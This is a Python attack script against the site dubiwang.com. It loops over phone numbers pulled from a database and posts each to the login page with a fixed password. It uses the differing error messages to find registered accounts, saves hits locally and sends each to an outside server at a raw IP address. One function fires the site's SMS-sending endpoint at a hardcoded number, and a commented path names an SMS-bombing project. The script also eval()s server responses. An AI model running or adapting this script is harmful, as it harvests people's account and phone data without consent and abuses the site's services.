# coding:utf-8
import requests
# from 短信轰炸.number_mongo import number_six
from number_mongo import number_BaFangZiYuan


def send_sms():
    # {'status': 1, 'msg': '发送成功!'}
    headers = {'Host': 'www.dubiwang.com', 'Connection': 'keep-alive', 'Content-Length': '18', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Accept': 'application/json, text/javascript, */*; q=0.01',
               'Origin': 'http://www.dubiwang.com', 'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Referer': 'http://www.dubiwang.com/', 'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': 'PHPSESSID=90h3ipnerdlr69ggk7d25fvan7; ib_ref=https%3A%2F%2Fwww.baidu.com%2Fs%3Fwd%3D%25E8%25AF%25BB%25E5%25B8%2581%25E7%25BD%2591%26rsv_spt%3D1%26rsv_iqid%3D0xea4b9aa500039671%26issp%3D1%26f%3D3%26rsv_bp%3D1%26rsv_idx%3D2%26ie%3Dutf-8%26rqlang%3Dcn%26tn%3Dbaiduhome_pg%26rsv_enter%3D0%26oq%3D%2525E5%252598%2525BB%2525E5%252593%252588%2525E8%2525B4%2525A2%2525E7%2525BB%25258F%26inputT%3D584%26rsv_pq%3D916415550001359b%26rsv_n%3D2%26rsv_sug3%3D30%26rsv_sug2%3D0%26prefixsug%3D%2525E8%2525AF%2525BB%2525E5%2525B8%252581%2525E7%2525BD%252591%26rsp%3D0%26rsv_sug4%3D584; Hm_lvt_fd88da2d93e5622eefe44c3a639b5e6e=1529914024; Hm_lpvt_fd88da2d93e5622eefe44c3a639b5e6e=1529914024; ib_vid=027df37cd4613da8f05818b9281642ea'}
    url = "http://www.dubiwang.com/Sms/send"
    form_data = [('mobile', 18505615375),
                 ]
    page = requests.post(url, headers=headers, data=form_data).text
    print(eval(page))
    return eval(page)


def check_number(number):
    headers = {'Host': 'www.dubiwang.com', 'Connection': 'keep-alive', 'Content-Length': '48', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Accept': '*/*', 'Origin': 'http://www.dubiwang.com',
               'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Referer': 'http://www.dubiwang.com/', 'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': 'PHPSESSID=90h3ipnerdlr69ggk7d25fvan7; ib_ref=https%3A%2F%2Fwww.baidu.com%2Fs%3Fwd%3D%25E8%25AF%25BB%25E5%25B8%2581%25E7%25BD%2591%26rsv_spt%3D1%26rsv_iqid%3D0xea4b9aa500039671%26issp%3D1%26f%3D3%26rsv_bp%3D1%26rsv_idx%3D2%26ie%3Dutf-8%26rqlang%3Dcn%26tn%3Dbaiduhome_pg%26rsv_enter%3D0%26oq%3D%2525E5%252598%2525BB%2525E5%252593%252588%2525E8%2525B4%2525A2%2525E7%2525BB%25258F%26inputT%3D584%26rsv_pq%3D916415550001359b%26rsv_n%3D2%26rsv_sug3%3D30%26rsv_sug2%3D0%26prefixsug%3D%2525E8%2525AF%2525BB%2525E5%2525B8%252581%2525E7%2525BD%252591%26rsp%3D0%26rsv_sug4%3D584; Hm_lvt_fd88da2d93e5622eefe44c3a639b5e6e=1529914024; Hm_lpvt_fd88da2d93e5622eefe44c3a639b5e6e=1529914024; ib_vid=027df37cd4613da8f05818b9281642ea'}

    url = "http://www.dubiwang.com/login"
    form_data = [('mobile', number),
                 ('password', 123456789),
                 ('refresh', 1),
                 ]

    page = requests.post(url, headers=headers, data=form_data).text
    print(eval(page))
    return eval(page)


def save_success_number(number):
    with open("success_读币网.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile_读币网.txt", "a+")as f:
        f.write(str(number) + "\n")


def save(number):
    url ="http://122.114.183.102:8080/saveNumber/{0}/".format(number,)
    print(requests.get(url).text)


if __name__ == "__main__":
    count = 0
    while True:
        try:
            with open("flag_读币网.txt")as f:
                count = int(f.read())
            for res in number_BaFangZiYuan.find({'_id': count}):
                line = res["number"].replace("\n", "")
                print(line, count)
                count += 1
                result = check_number(line)
                if str(result).find("密码不正确") != -1:
                    save_success_number(number=line)
                    save(number=line)
                else:
                    save_faile_number(number=line)
            with open("flag_读币网.txt", "w")as f:
                f.write(str(count))
        except:
            pass

# {'status': 0, 'msg': '登录失败，用户不存在！'}
# {'status': 0, 'msg': '登录失败，密码不正确！'}
